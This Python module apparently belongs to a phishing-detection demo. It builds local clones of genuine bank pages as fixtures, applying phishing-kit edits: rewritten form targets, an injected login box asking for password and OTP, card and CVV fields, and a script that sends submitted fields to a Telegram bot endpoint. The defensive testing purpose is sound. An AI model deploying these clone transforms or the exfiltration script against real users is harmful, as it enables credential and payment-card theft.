"""Genuine snapshots and the local fake pages built from them (P8).

**Genuine references** live in ``data/snapshots/<brand>/`` (``scripts/data/snapshot_genuine.py``): the live
screenshots, the rendered DOM and a HAR of every response.

**Static form.** A rendered DOM with its ``<script>`` elements removed and a ``<base href>`` pointing at the
genuine page, so styles, images and fonts load from the brand's own origin, served from the HAR in the
sandbox. Both the genuine reference and the clones are rendered from this form, in the same sandbox, so a
visual difference means a real edit, not a rendering accident.

**Clones** (``demo/fixtures/sites.yaml``: ``clone_of`` + ``transforms``) are the static form plus the edits a
phishing kit makes: a new form target, injected fields, a login box. They're generated into
``demo/fixtures/generated/`` (gitignored): the repo never ships ready-made copies of bank pages. Every
transform is recorded, so the Page Inspector's findings can be checked against what was actually changed.

**Kit behaviour (P9).** ``exfil_script`` adds a kit's client-side exfiltration (a Telegram bot send before the
normal post). A fixture's ``backend`` plays the kit's server for the Credential Tracker: ``accepts: any`` (every
login "works", then ``then:`` bounces to a URL) or ``accepts: none`` (wrong logins are rejected, as a real
login does). The sandbox answers with it; without one it answers with its own placeholder, which the tracker
treats as "no backend: behaviour unknown".
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass
from functools import lru_cache
from html import escape
from pathlib import Path
from urllib.parse import urljoin, urlsplit

from doppel.contract import REPO_ROOT, load_yaml

SNAPSHOTS = REPO_ROOT / "data" / "snapshots"
FIXTURE_DIR = REPO_ROOT / "demo" / "fixtures"
SITES = FIXTURE_DIR / "sites.yaml"
GENERATED = FIXTURE_DIR / "generated"

_SCRIPT = re.compile(r"<script\b[^>]*>.*?</script\s*>", re.I | re.S)
_SCRIPT_OPEN = re.compile(r"<script\b[^>]*/>", re.I)
_REFRESH = re.compile(r"<meta[^>]+http-equiv=[\"']?refresh[^>]*>", re.I)
_BASE = re.compile(r"<base\b[^>]*>", re.I)
_HEAD = re.compile(r"<head\b[^>]*>", re.I)
_FORM_OPEN = re.compile(r"<form\b([^>]*)>", re.I)
_ACTION = re.compile(r"\saction\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", re.I)
_BODY_END = re.compile(r"</body\s*>", re.I)
_INPUT = re.compile(r"<input\b[^>]*>", re.I)
_VALUE = re.compile(r"\svalue\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", re.I)
_NAME = re.compile(r"\sname\s*=", re.I)
_KEEP_VALUE = re.compile(r"type\s*=\s*[\"']?(hidden|submit|button|checkbox|radio|reset|image)", re.I)


def _empty_inputs(html: str) -> str:
    """Typed-in or framework-bound values (Angular serialises its bindings) cleared, as a fresh page shows them."""
    return _INPUT.sub(lambda m: m.group(0) if _KEEP_VALUE.search(m.group(0)) else _VALUE.sub("", m.group(0)), html)


@dataclass(frozen=True)
class Reference:
    brand: str
    url: str           # the genuine page's final URL (base for its assets)
    dir: Path

    @property
    def host(self) -> str:
        return urlsplit(self.url).hostname or ""

    @property
    def har(self) -> Path:
        return self.dir / "page.har.zip"

    @property
    def dom(self) -> Path:
        return self.dir / "dom.html"

    def screenshot(self, view: str = "desktop") -> Path:
        return self.dir / f"{view}.png"

    @property
    def ok(self) -> bool:
        return self.dom.exists() and self.har.exists() and self.screenshot().exists()


def manifest() -> dict:
    p = SNAPSHOTS / "MANIFEST.json"
    return json.loads(p.read_text(encoding="utf-8")) if p.exists() else {}


@lru_cache(maxsize=None)
def references() -> dict[str, Reference]:
    """Brands with a usable snapshot (DOM + HAR + screenshot)."""
    out = {}
    for brand, rec in manifest().items():
        if "error" in rec:
            continue
        ref = Reference(brand, rec["final_url"], SNAPSHOTS / brand)
        if ref.ok:
            out[brand] = ref
    return out


def static_html(ref: Reference) -> str:
    """The genuine page's rendered DOM, scripts removed, assets resolved against the genuine URL."""
    html = ref.dom.read_text(encoding="utf-8")
    html = _SCRIPT.sub("", html)
    html = _SCRIPT_OPEN.sub("", html)
    html = _REFRESH.sub("", html)
    html = _empty_inputs(html)
    own = _BASE.search(html)                      # SPAs set their own base (Angular: <base href="/">)
    href = re.search(r"href\s*=\s*[\"']([^\"']*)[\"']", own.group(0), re.I) if own else None
    target = urljoin(ref.url, href.group(1)) if href else ref.url
    html = _BASE.sub("", html)
    base = f'<base href="{escape(target, quote=True)}">'
    return _HEAD.sub(lambda m: m.group(0) + base, html, count=1) if _HEAD.search(html) else base + html


# ------------------------------------------------------------------ transforms ---

LOGIN_BOX = """
<div id="doppel-kit-login" style="position:fixed;top:120px;right:80px;width:340px;z-index:99999;background:#fff;
 border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,.25);padding:22px;font-family:Arial,sans-serif">
 <form action="{action}" method="post">
  <div style="font-size:18px;font-weight:bold;margin-bottom:12px">{title}</div>
  <input name="mobile" type="tel" placeholder="Mobile number" style="width:100%;padding:10px;margin:6px 0;box-sizing:border-box">
  <input name="password" type="password" placeholder="Password" style="width:100%;padding:10px;margin:6px 0;box-sizing:border-box">
  <input name="otp" type="text" placeholder="OTP" style="width:100%;padding:10px;margin:6px 0;box-sizing:border-box">
  <button type="submit" style="width:100%;padding:11px;margin-top:8px;background:#00baf2;color:#fff;border:0;border-radius:6px">Sign in</button>
 </form>
</div>"""

CARD_FIELDS = """
<div id="doppel-kit-card" style="margin:10px 0;font-family:Arial,sans-serif">
 <input name="card_number" placeholder="Card number" style="display:block;width:90%;padding:8px;margin:5px 0">
 <input name="cvv" placeholder="CVV" style="display:inline-block;width:30%;padding:8px;margin:5px 0">
 <input name="expiry" placeholder="MM/YY" style="display:inline-block;width:30%;padding:8px;margin:5px 0">
 <input name="otp" placeholder="OTP" style="display:block;width:90%;padding:8px;margin:5px 0">
</div>"""


def fake_telegram_token(seed: str = "fixture") -> str:
    """A string shaped like a Telegram bot token (``digits:35 chars``), made up for our fixtures.

    Built at runtime so no token-shaped literal sits in the repo (secret scanners would flag it). It is not a
    real token, and Doppel never calls Telegram anyway: the sandbox answers that request locally."""
    digits = str(7311000000 + sum(map(ord, seed)) % 99999)
    body = ("AAF" + "doppel" + "".join(c for c in seed if c.isalnum()) + "NotARealToken" + "x" * 35)[:35]
    return digits + ":" + body


# A kit script (P9): on submit, send every field to a Telegram bot first, then let the form post as usual.
# Sends with fetch + URLSearchParams (a "simple" CORS request, as client-side kits do).
TELEGRAM_KIT = """
<script>/* doppel fixture kit: Telegram exfil (never contacts Telegram: the sandbox answers locally) */
(function () {{
  var T = "{token}", CHAT = "{chat}";
  document.addEventListener("submit", function (e) {{
    var f = e.target;
    if (f.getAttribute("data-sent")) return;
    e.preventDefault();
    var lines = [];
    new FormData(f).forEach(function (v, k) {{ lines.push(k + ": " + v); }});
    fetch("https://api.telegram.org/bot" + T + "/sendMessage",
          {{ method: "POST", body: new URLSearchParams({{ chat_id: CHAT, text: lines.join("\\n") }}) }})
      .catch(function () {{}})
      .then(function () {{ f.setAttribute("data-sent", "1"); HTMLFormElement.prototype.submit.call(f); }});
  }}, true);
}})();
</script>"""


def _set_actions(html: str, action: str) -> tuple[str, int]:
    n = 0

    def repl(m: re.Match) -> str:
        nonlocal n
        n += 1
        attrs = _ACTION.sub("", m.group(1))
        return f'<form action="{escape(action, quote=True)}" method="post"{attrs}>'

    return _FORM_OPEN.sub(repl, html), n


def apply(html: str, transforms: list[dict], host: str) -> tuple[str, list[dict]]:
    """Apply kit edits; returns the page and a log of what was actually changed."""
    log = []
    for t in transforms:
        kind = t["kind"]
        action = t.get("action", "").replace("{host}", host)
        if kind == "form_action":
            html, n = _set_actions(html, action)
            log.append({"kind": kind, "action": action, "forms_changed": n})
        elif kind == "inject_login":
            box = LOGIN_BOX.format(action=escape(action, quote=True), title=escape(t.get("title", "Sign in")))
            html = _BODY_END.sub(lambda m: box + m.group(0), html, count=1)
            log.append({"kind": kind, "action": action, "fields": ["mobile", "password", "otp"]})
        elif kind == "inject_card_fields":
            m = list(_FORM_OPEN.finditer(html))
            idx = min(t.get("form_index", 0), len(m) - 1) if m else -1
            if idx >= 0:
                pos = m[idx].end()
                html = html[:pos] + CARD_FIELDS + html[pos:]
            else:
                html = _BODY_END.sub(lambda mm: CARD_FIELDS + mm.group(0), html, count=1)
            log.append({"kind": kind, "fields": ["card_number", "cvv", "expiry", "otp"]})
        elif kind == "name_inputs":
            # A saved SPA page posts nothing without its scripts (Angular inputs have no name), so a kit names
            # the fields itself before its form or script can send them.
            named = []

            def add_name(m: re.Match) -> str:
                tag = m.group(0)
                if _NAME.search(tag) or _KEEP_VALUE.search(tag):
                    return tag
                pw = re.search(r"type\s*=\s*[\"']?password", tag, re.I)
                idm = re.search(r"\sid\s*=\s*[\"']([^\"']+)", tag, re.I)
                name = "password" if pw else idm.group(1) if idm else f"field{len(named) + 1}"
                named.append(name)
                return tag[:6] + f' name="{escape(name, quote=True)}"' + tag[6:]

            html = _INPUT.sub(add_name, html)
            log.append({"kind": kind, "named": named})
        elif kind == "exfil_script":
            if t.get("channel") != "telegram":
                raise ValueError(f"unknown exfil channel {t.get('channel')!r}")
            script = TELEGRAM_KIT.format(token=fake_telegram_token(host), chat=t.get("chat_id", "-1001234567"))
            html = _BODY_END.sub(lambda m: script + m.group(0), html, count=1)
            log.append({"kind": kind, "channel": "telegram", "endpoint": "api.telegram.org"})
        else:
            raise ValueError(f"unknown transform {kind!r}")
    return html, log


# ------------------------------------------------------------------ fixtures ---

def sites() -> dict:
    return load_yaml(SITES).get("sites", {}) if SITES.exists() else {}


def generated_path(host: str) -> Path:
    return GENERATED / f"{host}.html"


def build_site(host: str, spec: dict) -> dict | None:
    """Write the generated page for one fixture host; returns its build record, or None if not a clone."""
    brand = spec.get("clone_of")
    if not brand:
        return None
    ref = references().get(brand)
    if ref is None:
        return {"host": host, "clone_of": brand, "built": False, "why": "no snapshot for this brand"}
    html, log = apply(static_html(ref), spec.get("transforms", []), host)
    GENERATED.mkdir(parents=True, exist_ok=True)
    generated_path(host).write_text(html, encoding="utf-8")
    rec = {"host": host, "clone_of": brand, "built": True, "reference_url": ref.url, "transforms": log}
    (GENERATED / f"{host}.json").write_text(json.dumps(rec, indent=1), encoding="utf-8")
    return rec


def build_all() -> list[dict]:
    return [r for host, spec in sites().items() if (r := build_site(host, spec))]


def stale_clones() -> list[str]:
    """Fixture kits whose generated clone is missing, or older than ``sites.yaml`` or than the genuine snapshot it
    copies. The demo must not run on those (P14): rebuild with ``python -m doppel.deep.pages``."""
    if not SITES.exists():
        return []
    yaml_m, refs, out = SITES.stat().st_mtime, references(), []
    for host, spec in sites().items():
        brand = spec.get("clone_of")
        if not brand or spec.get("status") == "none":
            continue
        ref, gen = refs.get(brand), generated_path(host)
        if ref is None:
            out.append(f"{host}: no saved snapshot of {brand} (run scripts/data/snapshot_genuine.py)")
        elif not gen.exists():
            out.append(f"{host}: clone not generated")
        elif gen.stat().st_mtime < yaml_m:
            out.append(f"{host}: clone older than demo/fixtures/sites.yaml")
        elif ref.dom.exists() and gen.stat().st_mtime < ref.dom.stat().st_mtime:
            out.append(f"{host}: clone older than the {brand} snapshot")
    return out


def page_html(host: str) -> tuple[str | None, dict]:
    """The page a fixture host serves: the generated clone if built, else its committed hand-made page.

    Returns (html or None, info) where info says which one and how it was made."""
    spec = sites().get(host)
    if spec is None or spec.get("status") == "none":
        return None, {}
    gen = generated_path(host)
    backend = {"backend": spec["backend"]} if spec.get("backend") else {}
    if spec.get("clone_of") and gen.exists():
        meta_file = GENERATED / f"{host}.json"
        meta = json.loads(meta_file.read_text(encoding="utf-8")) if meta_file.exists() else {}
        return gen.read_text(encoding="utf-8"), {"source": "generated_clone", "clone_of": spec["clone_of"],
                                                  "transforms": meta.get("transforms", []), "file": str(gen), **backend}
    if spec.get("page"):
        p = FIXTURE_DIR / spec["page"]
        return p.read_text(encoding="utf-8"), {"source": "hand_made_mock", "file": str(p), **backend}
    return None, {}


if __name__ == "__main__":
    for r in build_all():
        print(("built " if r["built"] else "SKIP  ") + f"{r['host']} <- {r['clone_of']}"
              + (f": {', '.join(t['kind'] for t in r['transforms'])}" if r["built"] else f" ({r['why']})"))
